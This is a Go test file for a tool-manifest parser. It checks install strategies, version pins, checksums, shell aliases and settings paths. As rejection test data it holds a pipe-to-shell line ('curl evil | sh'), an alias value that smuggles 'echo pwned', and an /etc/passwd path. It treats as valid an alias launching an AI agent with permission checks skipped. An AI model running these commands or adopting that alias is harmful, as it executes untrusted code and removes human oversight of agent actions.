package manifest

import (
	"os"
	"reflect"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// writeFile is a small fixture helper so a test that cares about *which* file
// failed does not have to care about mode bits.
func writeFile(path, content string) error {
	return os.WriteFile(path, []byte(content), 0o644)
}

// validTool is a manifest that must always parse. Cases below mutate one
// thing at a time so a failure names the rule that broke, not the whole
// document.
const validTool = `
name: ripgrep
description: Fast recursive grep
category: search
default: true
tested: true
tags: [search, text]
provides: [rg]
verify:
  command: rg --version
  version:
    command: rg --version
    min: "14.0"
install:
  darwin:
    strategy: package
    manager: brew
    package: ripgrep
  linux:
    strategy: package
    manager: apt
    package: ripgrep
`

func TestParseValid(t *testing.T) {
	t.Parallel()

	tool, err := Parse([]byte(validTool))
	if err != nil {
		t.Fatalf("valid manifest rejected: %v", err)
	}
	if tool.Name != "ripgrep" {
		t.Errorf("Name = %q, want ripgrep", tool.Name)
	}
	if tool.Install["darwin"].Manager != ManagerBrew {
		t.Errorf("darwin manager = %q, want brew", tool.Install["darwin"].Manager)
	}
	if tool.Verify == nil || tool.Verify.Version == nil {
		t.Fatal("verify.version did not survive parsing")
	}
	if got := tool.Verify.Version.Min.FloorFor(""); got != "14.0" {
		t.Errorf("min = %q, want 14.0", got)
	}
}

// TestParseRejects covers every way a manifest can be wrong. Each case
// asserts on the error text: the contract is that the message names the
// offending field, not merely that parsing failed.
// aliases: declares the shell shortcuts a tool installs alongside its
// binary. The VALUE is the whole command, deliberately: ACFS declares only
// the name in its manifest and keeps the body in a hand-written zshrc, which
// is two sources of truth and already drifted once there.
func TestAliasesParseIntoTheTool(t *testing.T) {
	t.Parallel()

	tool, err := Parse([]byte(validTool + "\naliases:\n  cc: 'claude --dangerously-skip-permissions'\n"))
	if err != nil {
		t.Fatalf("aliases: rejected on a well-formed value: %v", err)
	}
	if got := tool.Aliases["cc"]; got != "claude --dangerously-skip-permissions" {
		t.Errorf("Aliases[cc] = %q, want the full command", got)
	}
}

// TestAliasesReject covers every way an alias can be a hole rather than a
// shortcut. Each lands in a sourced shell file, so the constraint is the same
// one that governs the rest of the schema: no arbitrary text in, no way to
// smuggle a second statement.
func TestAliasesReject(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		yaml string
		want string
	}{
		{
			// An alias name goes into `alias NAME=...` and the shell
			// re-evaluates it, so it must be a name, not a command.
			name: "a name with a space is not a command",
			yaml: "aliases:\n  'my tool': claude\n",
			want: "aliases",
		},
		{
			// A newline is a second statement in a sourced file. That is
			// the same shape as the I3 no-run rule.
			name: "a newline in the value is a second statement",
			// Real newlines for YAML structure, and the double-quoted value
			// keeps its escape so YAML interprets it into a real newline in
			// the value. A single-quoted YAML scalar would pass \n through
			// as two literal characters, and the test would look right
			// while proving nothing.
			yaml: "aliases:\n  cc: \"claude\\necho pwned\"\n",
			want: "aliases",
		},
		{
			name: "an empty value declares nothing",
			yaml: "aliases:\n  cc: ''\n",
			want: "aliases",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			_, err := Parse([]byte(validTool + tc.yaml))
			if err == nil {
				t.Fatalf("aliases accepted %q without complaint", tc.name)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not name %q", err, tc.want)
			}
		})
	}
}

// An alias must not silently collide with another tool's name, or one catalog
// entry becomes unreachable.
func TestAliasesMustNotShadowCatalogNames(t *testing.T) {
	t.Parallel()

	// Self-shadow is the case Parse can see: only the tool's own manifest
	// is in scope. Cross-tool collisions (an alias naming another tool) are
	// checked where the whole catalog is visible, in internal/catalog.
	for _, tc := range []struct{ alias, tool string }{
		{"ripgrep", "ripgrep"},
	} {
		t.Run(tc.alias+" must not equal "+tc.tool, func(t *testing.T) {
			t.Parallel()
			src := validTool + "aliases:\n  " + tc.alias + ": 'claude'\n"
			_, err := Parse([]byte(src))
			if err == nil {
				t.Fatalf("alias %q was accepted even though it shadows tool %q", tc.alias, tc.tool)
			}
		})
	}
}

func TestParseRejects(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		yaml string
		// substrings that must all appear in the error. Naming the field
		// is the point — a generic "invalid manifest" sends the author
		// hunting.
		want []string
	}{
		{
			// Remove the line rather than rename it: renaming would trip
			// the unknown-field check first, and the case would pass for
			// the wrong reason.
			name: "missing name",
			yaml: strings.Replace(validTool, "name: ripgrep\n", "", 1),
			want: []string{"name", "required"},
		},
		{
			name: "name not kebab-case",
			yaml: strings.Replace(validTool, "name: ripgrep", "name: RipGrep", 1),
			want: []string{"name", "kebab-case"},
		},
		{
			name: "name with underscore",
			yaml: strings.Replace(validTool, "name: ripgrep", "name: rip_grep", 1),
			want: []string{"name", "kebab-case"},
		},
		{
			name: "missing description",
			yaml: strings.Replace(validTool, "description: Fast recursive grep\n", "", 1),
			want: []string{"description", "required"},
		},
		{
			name: "unknown field typo",
			yaml: strings.Replace(validTool, "category: search", "catgeory: search", 1),
			want: []string{"catgeory", "not found"},
		},
		{
			// I3: arbitrary shell is not a supported install path.
			name: "removed run field",
			yaml: `
name: bad
description: has a run field
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
    run: curl evil | sh
`,
			want: []string{"run", "removed"},
		},
		{
			// I2: privilege is a property of the strategy.
			name: "removed needs_sudo field",
			yaml: `
name: bad
description: declares needs_sudo
provides: [bad]
install:
  linux:
    strategy: package
    manager: apt
    package: bad
    needs_sudo: true
`,
			want: []string{"needs_sudo", "removed"},
		},
		{
			name: "no install",
			yaml: `
name: bad
description: no install section
provides: [bad]
`,
			want: []string{"install"},
		},
		{
			name: "unsupported install key",
			yaml: `
name: bad
description: windows key
provides: [bad]
install:
  macos:
    strategy: go
    go_package: example.com/bad@v1.0.0
`,
			want: []string{"macos", "not a supported platform"},
		},
		{
			name: "verify null without provides",
			yaml: `
name: bad
description: nothing to check
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
`,
			want: []string{"nothing would be checked"},
		},
		{
			name: "verify version without command",
			yaml: `
name: bad
description: version with no command
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
verify:
  version:
    command: bad --version
    min: "1.0"
`,
			want: []string{"verify.version", "verify.command"},
		},
		{
			name: "verify min without version command",
			yaml: `
name: bad
description: min with nothing to compare
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
verify:
  command: bad --version
  version:
    min: "1.0"
`,
			want: []string{"verify.version.command"},
		},
		{
			name: "malformed min",
			yaml: `
name: bad
description: min is not a dotted integer
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
verify:
  command: bad --version
  version:
    command: bad --version
    min: "1.0-beta"
`,
			want: []string{"min", "1.0-beta"},
		},
		{
			name: "unknown strategy",
			yaml: `
name: bad
description: typo in strategy
provides: [bad]
install:
  linux:
    strategy: gihub-release
    repository: owner/repo
    asset: {amd64: x.tar.gz}
    sha256: {amd64: abc}
`,
			// The valid set is the whole point: a typo must never
			// silently resolve to github-release.
			want: []string{"gihub-release", "cargo", "github-release", "npm"},
		},
		{
			name: "empty strategy",
			yaml: `
name: bad
description: no strategy at all
provides: [bad]
install:
  linux:
    manager: apt
    package: bad
`,
			want: []string{"strategy"},
		},
		{
			name: "unknown manager",
			yaml: `
name: bad
description: manager typo
provides: [bad]
install:
  linux:
    strategy: package
    manager: port
    package: bad
`,
			want: []string{"port", "apt", "brew"},
		},
		{
			name: "package missing package field",
			yaml: `
name: bad
description: package strategy with no package
provides: [bad]
install:
  linux:
    strategy: package
    manager: apt
`,
			want: []string{"package"},
		},
		{
			name: "github-release missing sha256",
			yaml: `
name: bad
description: unverified download
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      amd64: tool-linux-amd64.tar.gz
`,
			want: []string{"sha256"},
		},
		{
			name: "github-release missing repository",
			yaml: `
name: bad
description: no repository
provides: [bad]
install:
  linux:
    strategy: github-release
    asset: {amd64: tool-linux-amd64.tar.gz}
    sha256: {amd64: abc}
`,
			want: []string{"repository"},
		},
		{
			// Cross-cutting: a missing checksum on exactly one arch is
			// the failure mode that ships unverified binaries.
			name: "sha256 missing for one arch",
			yaml: `
name: bad
description: amd64 asset with no checksum
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      amd64: tool-linux-amd64.tar.gz
      arm64: tool-linux-arm64.tar.gz
    sha256:
      arm64: def
`,
			want: []string{"sha256", "amd64"},
		},
		{
			name: "asset missing for one arch",
			yaml: `
name: bad
description: arm64 checksum with no asset
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      amd64: tool-linux-amd64.tar.gz
    sha256:
      amd64: abc
      arm64: def
`,
			want: []string{"asset", "arm64"},
		},
		{
			// `binary` is an arch-keyed map exactly like `asset` and `sha256`,
			// so the same vocabulary applies — and it did not. validateArchMaps
			// only ran inside the github-release branch, and Target.present()
			// omitted "binary" entirely, so on the other four strategies the
			// field was accepted silently AND its keys went unvalidated.
			//
			// The two halves fail independently. The rejected-list half means a
			// `go` target may carry a `binary` map at all; the arch half means
			// that map's keys are never checked. Either alone is the hole.
			name: "binary on a non-github-release strategy",
			yaml: `
name: bad
description: binary map where the strategy has none
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
    binary:
      amd64: bad
`,
			// "must not set field", not a bare "binary": the coverage check
			// also mentions binary, so a loose substring passes against an
			// unrelated error and the rejected-list entry could be deleted
			// without anything noticing.
			want: []string{"must not set field", "binary"},
		},
		{
			// The uname vocabulary must not reach a binary key either, and this
			// is the one that has no guard at all today: the github-release
			// branch validates, the go branch does not.
			name: "x86_64 binary key",
			yaml: `
name: bad
description: uname arch in a manifest
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      amd64: tool-linux.tar.gz
    sha256:
      amd64: abc
    binary:
      x86_64: bad
`,
			want: []string{"x86_64", "amd64", "arm64"},
		},
		{
			// The other half of the same hole. `binary` is a github-release
			// field, so a `go` target carrying one is a manifest that
			// contradicts itself — and it parsed cleanly until the
			// rejected-list entry could actually fire.
			name: "binary on a go target is rejected",
			yaml: `
name: bad
description: binary map on a strategy that has none
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
    binary:
      amd64: bad
`,
			want: []string{"binary"},
		},
		{
			// The arch vocabulary question on a non-github strategy, and why
			// this case names `binary` rather than `x86_64`.
			//
			// Both are true, and the rejected-field error comes first because
			// it is the more fundamental one: a `go` target has no `binary` to
			// be spelled wrongly. Reordering the checks to name the bad arch
			// would report a consequence and hide the cause.
			//
			// It also means the arch-vocabulary rule is unreachable on the
			// other four strategies today — every one of them rejects `binary`
			// outright — so the "or carries a binary map" half of the
			// validation is defence in depth for a future strategy, not
			// something a test can reach. Said here rather than left for a
			// reader to assume it is covered.
			name: "x86_64 binary key on a go target",
			yaml: `
name: bad
description: uname arch in a manifest
provides: [bad]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
    binary:
      x86_64: bad
`,
			want: []string{"must not set field", "binary"},
		},
		{
			// uname's vocabulary has no place inside a manifest.
			name: "x86_64 asset key",
			yaml: `
name: bad
description: uname arch in a manifest
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      x86_64: tool-linux.tar.gz
    sha256:
      x86_64: abc
`,
			want: []string{"x86_64", "amd64", "arm64"},
		},
		{
			name: "aarch64 asset key",
			yaml: `
name: bad
description: uname arch in a manifest
provides: [bad]
install:
  linux:
    strategy: github-release
    repository: owner/repo
    asset:
      aarch64: tool-linux.tar.gz
    sha256:
      aarch64: abc
`,
			want: []string{"aarch64", "amd64", "arm64"},
		},
		{
			name: "self dependency",
			yaml: `
name: loop
description: depends on itself
provides: [loop]
dependencies: [loop]
install:
  linux:
    strategy: go
    go_package: example.com/loop@v1.0.0
`,
			want: []string{"depends on itself"},
		},
		{
			name: "duplicate dependency",
			yaml: `
name: dup
description: lists git twice
provides: [dup]
dependencies: [git, git]
install:
  linux:
    strategy: go
    go_package: example.com/dup@v1.0.0
`,
			want: []string{"more than once"},
		},
		{
			name: "malformed dependency name",
			yaml: `
name: bad
description: dependency is not kebab-case
provides: [bad]
dependencies: [NotATool]
install:
  linux:
    strategy: go
    go_package: example.com/bad@v1.0.0
`,
			want: []string{"kebab-case"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			_, err := Parse([]byte(tc.yaml))
			if err == nil {
				t.Fatal("expected an error, got a valid Tool")
			}
			for _, w := range tc.want {
				if !strings.Contains(err.Error(), w) {
					t.Errorf("error %q does not name %q", err, w)
				}
			}
		})
	}
}

// TestStrategyFieldMatrix locks the required/rejected matrix. A manifest must
// carry exactly the fields its strategy needs — both a missing field and a
// borrowed one are errors, because either can install the wrong thing.
func TestStrategyFieldMatrix(t *testing.T) {
	t.Parallel()

	const head = "name: t\ndescription: strategy matrix\nprovides: [t]\ninstall:\n  linux:\n"

	cases := []struct {
		name     string
		target   string
		wantErr  bool
		wantWord string
	}{
		{name: "github-release complete", target: "    strategy: github-release\n    repository: o/r\n    asset: {amd64: a.tar.gz}\n    sha256: {amd64: abc}\n"},
		{name: "package brew complete", target: "    strategy: package\n    manager: brew\n    package: t\n"},
		{name: "package apt complete", target: "    strategy: package\n    manager: apt\n    package: t\n"},
		{name: "go complete", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n"},
		{name: "npm complete", target: "    strategy: npm\n    npm_package: t-pkg@v1.0.0\n"},
		{name: "cargo complete", target: "    strategy: cargo\n    cargo_name: t-crate@v1.0.0\n"},

		// Borrowed fields.
		{name: "github-release with package", target: "    strategy: github-release\n    repository: o/r\n    asset: {amd64: a.tar.gz}\n    sha256: {amd64: abc}\n    package: t\n", wantErr: true, wantWord: "package"},
		{name: "github-release with manager", target: "    strategy: github-release\n    repository: o/r\n    asset: {amd64: a.tar.gz}\n    sha256: {amd64: abc}\n    manager: brew\n", wantErr: true, wantWord: "manager"},
		{name: "package with repository", target: "    strategy: package\n    manager: apt\n    package: t\n    repository: o/r\n", wantErr: true, wantWord: "repository"},
		{name: "package with asset", target: "    strategy: package\n    manager: apt\n    package: t\n    asset: {amd64: a.tar.gz}\n", wantErr: true, wantWord: "asset"},
		{name: "package with sha256", target: "    strategy: package\n    manager: apt\n    package: t\n    sha256: {amd64: abc}\n", wantErr: true, wantWord: "sha256"},
		{name: "package with go_package", target: "    strategy: package\n    manager: apt\n    package: t\n    go_package: example.com/t@v1.0.0\n", wantErr: true, wantWord: "go_package"},
		{name: "go with package", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    package: t\n", wantErr: true, wantWord: "package"},
		{name: "go with asset", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    asset: {amd64: a.tar.gz}\n", wantErr: true, wantWord: "asset"},
		{name: "go with npm_package", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    npm_package: t@v1.0.0\n", wantErr: true, wantWord: "npm_package"},
		{name: "npm with go_package", target: "    strategy: npm\n    npm_package: t@v1.0.0\n    go_package: example.com/t@v1.0.0\n", wantErr: true, wantWord: "go_package"},
		{name: "cargo with npm_package", target: "    strategy: cargo\n    cargo_name: t@v1.0.0\n    npm_package: t@v1.0.0\n", wantErr: true, wantWord: "npm_package"},

		// uv is a sixth strategy, distinct from the package managers.
		{name: "uv complete", target: "    strategy: uv\n    uv_package: t-uv@v1.0.0\n"},
		{name: "uv with go_package", target: "    strategy: uv\n    uv_package: t-uv@v1.0.0\n    go_package: example.com/t@v1.0.0\n", wantErr: true, wantWord: "go_package"},
		{name: "go with uv_package", target: "    strategy: go\n    go_package: example.com/t@v1.0.0\n    uv_package: t-uv@v1.0.0\n", wantErr: true, wantWord: "uv_package"},

		// Version pinning is mandatory. An unpinned install changes under
		// the user with no record, which is the same hazard as an unpinned
		// release download.
		{name: "go without a pin", target: "    strategy: go\n    go_package: example.com/t\n", wantErr: true, wantWord: "go_package"},
		{name: "npm without a pin", target: "    strategy: npm\n    npm_package: t-pkg\n", wantErr: true, wantWord: "npm_package"},
		{name: "cargo without a pin", target: "    strategy: cargo\n    cargo_name: t-crate\n", wantErr: true, wantWord: "cargo_name"},
		{name: "uv without a pin", target: "    strategy: uv\n    uv_package: t-uv\n", wantErr: true, wantWord: "uv_package"},
		{name: "pin of latest is not a version", target: "    strategy: go\n    go_package: example.com/t@latest\n", wantErr: true, wantWord: "latest"},
		{name: "trailing at is not a pin", target: "    strategy: go\n    go_package: example.com/t@\n", wantErr: true, wantWord: "go_package"},
		{name: "leading at is a scope, not a pin", target: "    strategy: npm\n    npm_package: \"@scope/pkg\"\n", wantErr: true, wantWord: "npm_package"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			_, err := Parse([]byte(head + tc.target))
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("expected valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatal("expected an error, got a valid Tool")
			}
			if !strings.Contains(err.Error(), tc.wantWord) {
				t.Errorf("error %q does not name %q", err, tc.wantWord)
			}
		})
	}
}

// TestVerifyNullIsPresenceOnly pins the one case where a manifest checks
// something without naming a version command: provides carries it.
func TestVerifyNullIsPresenceOnly(t *testing.T) {
	t.Parallel()

	t.Run("null verify with provides is valid", func(t *testing.T) {
		t.Parallel()
		_, err := Parse([]byte(`
name: zoxide
description: presence-only tool
provides: [zoxide]
install:
  linux:
    strategy: go
    go_package: github.com/ajeetdsouza/zoxide@v1.0.0
`))
		if err != nil {
			t.Fatalf("verify: null with provides must be valid, got: %v", err)
		}
	})

	t.Run("empty provides with verify command is valid", func(t *testing.T) {
		t.Parallel()
		_, err := Parse([]byte(`
name: jq
description: command is the check
install:
  linux:
    strategy: package
    manager: apt
    package: jq
verify:
  command: jq --version
`))
		if err != nil {
			t.Fatalf("verify.command with empty provides must be valid, got: %v", err)
		}
	})
}

// TestRoundTrip proves a Tool survives a marshal/parse cycle unchanged, so a
// catalog can rewrite a manifest without silently changing it.
func TestRoundTrip(t *testing.T) {
	t.Parallel()

	first, err := Parse([]byte(validTool))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}

	encoded, err := yaml.Marshal(first)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	second, err := Parse(encoded)
	if err != nil {
		t.Fatalf("re-parse: %v\n%s", err, encoded)
	}
	if !reflect.DeepEqual(first, second) {
		t.Errorf("round trip changed the tool:\n first: %+v\nsecond: %+v", first, second)
	}
}

func TestValidStrategiesIsSorted(t *testing.T) {
	t.Parallel()

	got := ValidStrategies()
	want := []string{StrategyCargo, StrategyGithubRelease, StrategyGo, StrategyNPM, StrategyPackage, StrategyUV}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("ValidStrategies() = %v, want %v", got, want)
	}
}

// TestLoadNamesTheFile checks that a load failure identifies which file
// failed, not just which field. A catalog holding 40 manifests cannot
// otherwise tell the author where to look.
func TestLoadNamesTheFile(t *testing.T) {
	t.Parallel()

	dir := t.TempDir()
	path := dir + "/broken.yaml"
	if err := writeFile(path, "name: bad\ndescription: no install\nprovides: [bad]\n"); err != nil {
		t.Fatalf("write fixture: %v", err)
	}

	_, err := Load(path)
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "broken.yaml") {
		t.Errorf("error %q does not name the file", err)
	}
}

// Some upstreams name the binary inside the archive per platform and arch. yq
// ships yq_linux_amd64 and yq_darwin_arm64, so a single filename cannot
// describe the artefact and the installer would look for a file that has never
// existed. binary is a map for the same reason asset and sha256 are.
const zeros = "0000000000000000000000000000000000000000000000000000000000000000"

func TestBinaryMapCoversExactlyTheAssetArches(t *testing.T) {
	base := "name: yqlike\ndescription: per-arch binary name\ncategory: utility\n" +
		"install:\n  linux:\n    strategy: github-release\n    repository: e/x\n"

	for _, tc := range []struct {
		name    string
		extra   string
		wantErr string
	}{
		{
			name: "binary covering both arches",
			extra: "    asset:\n      amd64: a.tgz\n      arm64: b.tgz\n" +
				"    sha256:\n      amd64: " + zeros + "\n      arm64: " + zeros + "\n" +
				"    binary:\n      amd64: bin_amd64\n      arm64: bin_arm64\n",
		},
		{
			name: "binary covering fewer arches than asset",
			extra: "    asset:\n      amd64: a.tgz\n      arm64: b.tgz\n" +
				"    sha256:\n      amd64: " + zeros + "\n      arm64: " + zeros + "\n" +
				"    binary:\n      amd64: bin_amd64\n",
			wantErr: "binary covers 1 arches but asset covers 2",
		},
		{
			name: "binary with an arch asset does not have",
			extra: "    asset:\n      amd64: a.tgz\n" +
				"    sha256:\n      amd64: " + zeros + "\n" +
				"    binary:\n      amd64: bin_amd64\n      arm64: bin_arm64\n",
			wantErr: "binary covers 2 arches but asset covers 1",
		},
		{
			name: "binary empty for an arch asset has",
			extra: "    asset:\n      amd64: a.tgz\n      arm64: b.tgz\n" +
				"    sha256:\n      amd64: " + zeros + "\n      arm64: " + zeros + "\n" +
				"    binary:\n      amd64: bin_amd64\n      arm64: \"\"\n",
			wantErr: "binary is empty for arch",
		},
		{
			name: "no binary at all - the tool name is used, which is most tools",
			extra: "    asset:\n      amd64: a.tgz\n" +
				"    sha256:\n      amd64: " + zeros + "\n",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Parse([]byte(base + tc.extra + "verify:\n  command: yqlike\n"))
			switch {
			case tc.wantErr == "" && err != nil:
				t.Errorf("Parse: %v", err)
			case tc.wantErr != "" && err == nil:
				t.Errorf("Parse accepted it; want an error containing %q", tc.wantErr)
			case tc.wantErr != "" && !strings.Contains(err.Error(), tc.wantErr):
				t.Errorf("error = %q, want it to contain %q", err, tc.wantErr)
			}
		})
	}
}

// TestNoEcosystemNeedsPrivilege is the assertion the bead asks for: this must
// be a derived fact, not an assumption. All four write to user-owned
// directories.
func TestNoEcosystemNeedsPrivilege(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		strategy string
		target   Target
	}{
		{StrategyGo, Target{Strategy: StrategyGo, GoPackage: "x@v1"}},
		{StrategyNPM, Target{Strategy: StrategyNPM, NPMPackage: "x@1"}},
		{StrategyCargo, Target{Strategy: StrategyCargo, CargoName: "x@1"}},
		{StrategyUV, Target{Strategy: StrategyUV, UVPackage: "x@1"}},
	} {
		if RequiresPrivilege(tc.target) {
			t.Errorf("strategy %s requires privilege, want false", tc.strategy)
		}
	}
}

// TestOnlyAptNeedsPrivilege pins the other half of the derivation: exactly
// one strategy-manager pair escalates, and nothing else does.
func TestOnlyAptNeedsPrivilege(t *testing.T) {
	t.Parallel()

	escalating := Target{Strategy: StrategyPackage, Manager: ManagerApt}
	if !RequiresPrivilege(escalating) {
		t.Error("package+apt should require privilege")
	}
	for _, notEscalating := range []Target{
		{Strategy: StrategyPackage, Manager: ManagerBrew},
		{Strategy: StrategyGithubRelease},
		{Strategy: StrategyGo},
		{Strategy: StrategyNPM},
		{Strategy: StrategyCargo},
		{Strategy: StrategyUV},
		// A strategy other than package carrying a stray apt manager must
		// still not escalate. manifest validation rejects this combination,
		// so it is unreachable through a parsed manifest — but the
		// derivation is documented as being on (Strategy, Manager), and
		// this is the case that pins the Strategy half of that pair. A
		// Manager-only check would pass every other case here.
		{Strategy: StrategyGithubRelease, Manager: ManagerApt},
		{Strategy: StrategyGo, Manager: ManagerApt},
	} {
		if RequiresPrivilege(notEscalating) {
			t.Errorf("%s should not require privilege", notEscalating.Strategy)
		}
	}
}

// settings: is the one place AES edits a file outside ~/.aes, so its path
// rules are the ones that keep a manifest from choosing a destination.
func TestSettingsPathRules(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		yaml string
		want string
	}{
		{
			// A relative path with subdirectories is the normal case:
			// .claude/settings.json is two levels down.
			name: "a relative path with subdirectories is fine",
			yaml: "settings:\n  - path: .claude/settings.json\n    merge:\n      someKey: true\n",
			want: "",
		},
		{
			name: "an absolute path is refused",
			yaml: "settings:\n  - path: /etc/passwd\n    merge:\n      someKey: true\n",
			want: "relative to the user's home",
		},
		{
			// `..` is the only way a relative path escapes home, so it is
			// the only component that matters.
			name: "a path that climbs out of home is refused",
			yaml: "settings:\n  - path: ../escape/settings.json\n    merge:\n      someKey: true\n",
			want: "climbs out",
		},
		{
			name: "a rule with no keys declares nothing",
			yaml: "settings:\n  - path: .claude/settings.json\n",
			want: "no keys to merge",
		},
		{
			name: "a rule with no path names no file",
			yaml: "settings:\n  - merge:\n      someKey: true\n",
			want: "no path",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			_, err := Parse([]byte(validTool + tc.yaml))
			if tc.want == "" {
				if err != nil {
					t.Errorf("rejected a well-formed settings rule: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("settings accepted %q without complaint", tc.name)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not name %q", err, tc.want)
			}
		})
	}
}

// Floors understand two shapes: a scalar that applies everywhere, and a map
// from GOOS to the version that platform can supply. Ubuntu noble ships node
// 18 while brew ships node 26, so a single number means "the newest version
// aes has ever seen" rather than a statement about what a platform offers.
func TestFloorParsesBothShapes(t *testing.T) {
	t.Parallel()

	scalar, err := Parse([]byte(validTool))
	if err != nil {
		t.Fatalf("scalar manifest: %v", err)
	}
	if got := scalar.Verify.Version.Min.FloorFor(""); got != "14.0" {
		t.Errorf("scalar floor = %q, want 14.0", got)
	}
	if got := scalar.Verify.Version.Min.FloorFor("linux"); got != "14.0" {
		t.Errorf("scalar floor on linux = %q, want the single value", got)
	}

	mapped, err := Parse([]byte(strings.Replace(validTool,
		`    min: "14.0"`,
		"    min:\n      darwin: \"26.0\"\n      linux: \"18.0\"", 1)))
	if err != nil {
		t.Fatalf("mapped manifest: %v", err)
	}
	if got := mapped.Verify.Version.Min.FloorFor("darwin"); got != "26.0" {
		t.Errorf("darwin floor = %q, want 26.0", got)
	}
	if got := mapped.Verify.Version.Min.FloorFor("linux"); got != "18.0" {
		t.Errorf("linux floor = %q, want 18.0", got)
	}
}

// A floor that violates the dotted-integer rule on ANY platform is refused,
// including on a platform aes does not install on. A floor that fails the day
// someone adds that platform is a floor that should have failed when written.
func TestFloorRejectsEverywhere(t *testing.T) {
	t.Parallel()

	if _, err := Parse([]byte(strings.Replace(validTool,
		`    min: "14.0"`,
		"    min:\n      darwin: \"not-a-version\"\n      linux: \"18.0\"", 1))); err == nil {
		t.Error("a map with a bad darwin floor parsed without complaint")
	} else if !strings.Contains(err.Error(), "darwin") {
		t.Errorf("error %q does not name the offending platform", err)
	}

	// Unknown platforms are a platform aes does not install on.
	if _, err := Parse([]byte(strings.Replace(validTool,
		`    min: "14.0"`,
		"    min:\n      plan9: \"1.0\"\n      linux: \"18.0\"", 1))); err == nil {
		t.Error("a map with an unknown platform parsed without complaint")
	} else if !strings.Contains(err.Error(), "plan9") {
		t.Errorf("error %q does not name the offending platform", err)
	}
}
